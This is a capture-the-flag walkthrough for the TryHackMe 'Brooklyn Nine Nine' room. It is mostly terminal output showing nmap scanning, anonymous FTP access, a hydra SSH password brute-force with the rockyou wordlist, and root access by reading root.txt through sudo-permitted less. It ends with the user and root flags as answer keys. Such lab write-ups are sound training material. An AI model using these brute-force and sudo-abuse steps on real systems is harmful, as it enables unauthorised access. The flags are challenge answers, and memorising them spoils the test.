# Brooklyn Nine Nine

This room is aimed for beginner level hackers but anyone can try to hack this box. There are two main intended ways to root the box.

[Brooklyn Nine Nine](https://tryhackme.com/room/brooklynninenine)

## Topic's

- Network Enumeration
- FTP Enumeration
- Brute Forcing SSH
- Security Misconfiguration

## Appendix archive

Password: `1 kn0w 1 5h0uldn'7!`

## Task 1 Deploy and get hacking

This room is aimed for beginner level hackers but anyone can try to hack this box. There are two main intended ways to root the box. If you find more dm me in discord at Fsociety2006.

```
kali@kali:~/CTFs/tryhackme/Brooklyn Nine Nine$ sudo nmap -A -Pn -sS -sC -sV -O 10.10.45.119
[sudo] password for kali:
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-14 11:07 CEST
Nmap scan report for 10.10.45.119
Host is up (0.037s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             119 May 17 23:17 note_to_jake.txt
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.8.106.222
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 (RSA)
|   256 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee (ECDSA)
|_  256 ab:16:2e:79:20:3c:9b:0a:01:9c:8c:44:26:01:58:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=10/14%OT=21%CT=1%CU=39085%PV=Y%DS=2%DC=T%G=Y%TM=5F86C0
OS:09%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)OP
OS:S(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST
OS:11NW7%O6=M508ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)EC
OS:N(R=Y%DF=Y%T=40%W=F507%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
OS:D=S)

Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 143/tcp)
HOP RTT      ADDRESS
1   39.83 ms 10.8.0.1
2   39.91 ms 10.10.45.119

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.22 seconds
```

```
kali@kali:~/CTFs/tryhackme/Brooklyn Nine Nine$ ftp 10.10.45.119
Connected to 10.10.45.119.
220 (vsFTPd 3.0.3)
Name (10.10.45.119:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0             119 May 17 23:17 note_to_jake.txt
226 Directory send OK.
ftp> get note_to_jake.txt
local: note_to_jake.txt remote: note_to_jake.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for note_to_jake.txt (119 bytes).
226 Transfer complete.
119 bytes received in 0.08 secs (1.4283 kB/s)
ftp> cd ..
250 Directory successfully changed.
ftp> pwd
257 "/" is the current directory
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0             119 May 17 23:17 note_to_jake.txt
226 Directory send OK.
ftp> exit
221 Goodbye.
```

```
kali@kali:~/CTFs/tryhackme/Brooklyn Nine Nine$ cat note_to_jake.txt
From Amy,

Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
```

```
kali@kali:~/CTFs/tryhackme/Brooklyn Nine Nine$ hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://10.10.45.119
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-10-14 11:11:30
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://10.10.45.119:22/
[22][ssh] host: 10.10.45.119   login: jake   password: 987654321
```

```
kali@kali:~/CTFs/tryhackme/Brooklyn Nine Nine$ ssh jake@10.10.45.119
The authenticity of host '10.10.45.119 (10.10.45.119)' can't be established.
ECDSA key fingerprint is SHA256:Ofp49Dp4VBPb3v/vGM9jYfTRiwpg2v28x1uGhvoJ7K4.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.45.119' (ECDSA) to the list of known hosts.
jake@10.10.45.119's password:
Last login: Tue May 26 08:56:58 2020
jake@brookly_nine_nine:~$ ls
jake@brookly_nine_nine:~$ ls -la
total 44
drwxr-xr-x 6 jake jake 4096 May 26 09:01 .
drwxr-xr-x 5 root root 4096 May 18 10:21 ..
-rw------- 1 root root 1349 May 26 09:01 .bash_history
-rw-r--r-- 1 jake jake  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 jake jake 3771 Apr  4  2018 .bashrc
drwx------ 2 jake jake 4096 May 17 21:36 .cache
drwx------ 3 jake jake 4096 May 17 21:36 .gnupg
-rw------- 1 root root   67 May 26 09:01 .lesshst
drwxrwxr-x 3 jake jake 4096 May 26 08:57 .local
-rw-r--r-- 1 jake jake  807 Apr  4  2018 .profile
drwx------ 2 jake jake 4096 May 18 14:29 .ssh
-rw-r--r-- 1 jake jake    0 May 17 21:36 .sudo_as_admin_successful
jake@brookly_nine_nine:~$ ls -l /home
total 12
drwxr-xr-x 5 amy  amy  4096 May 18 10:23 amy
drwxr-xr-x 6 holt holt 4096 May 26 09:01 holt
drwxr-xr-x 6 jake jake 4096 May 26 09:01 jake
jake@brookly_nine_nine:~$ ls -la /home/holt
total 48
drwxr-xr-x 6 holt holt 4096 May 26 09:01 .
drwxr-xr-x 5 root root 4096 May 18 10:21 ..
-rw------- 1 holt holt   18 May 26 09:01 .bash_history
-rw-r--r-- 1 holt holt  220 May 17 21:42 .bash_logout
-rw-r--r-- 1 holt holt 3771 May 17 21:42 .bashrc
drwx------ 2 holt holt 4096 May 18 10:24 .cache
drwx------ 3 holt holt 4096 May 18 10:24 .gnupg
drwxrwxr-x 3 holt holt 4096 May 17 21:46 .local
-rw-r--r-- 1 holt holt  807 May 17 21:42 .profile
drwx------ 2 holt holt 4096 May 18 14:45 .ssh
-rw------- 1 root root  110 May 18 17:12 nano.save
-rw-rw-r-- 1 holt holt   33 May 17 21:49 user.txt
jake@brookly_nine_nine:~$ cat /home/holt/user.txt
ee11cbb19052e40b07aac0ca060c23ee
```

```
jake@brookly_nine_nine:~$ sudo -l
Matching Defaults entries for jake on brookly_nine_nine:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /usr/bin/less

jake@brookly_nine_nine:~$ sudo /usr/bin/less /root/root.txt
-- Creator : Fsociety2006 --
Congratulations in rooting Brooklyn Nine Nine
Here is the flag: 63a9f0ea7bb98050796b649e85481845

Enjoy!!
```

1. User flag

`ee11cbb19052e40b07aac0ca060c23ee`

2. Root flag

`63a9f0ea7bb98050796b649e85481845`
